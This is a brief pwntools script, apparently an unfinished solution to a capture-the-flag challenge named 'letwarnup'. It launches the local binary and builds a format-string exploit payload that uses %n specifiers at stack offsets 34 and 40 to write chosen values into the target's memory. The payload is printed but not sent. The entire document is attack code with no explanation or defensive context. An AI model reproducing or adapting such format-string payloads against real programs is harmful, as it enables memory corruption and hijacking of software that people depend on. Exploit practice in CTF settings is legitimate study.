from pwn import *

io = process('./letwarnup')

payload = '%4210752x%34$n'
payload += '%1000x%40$n'
print(payload)
#print(io.recv())
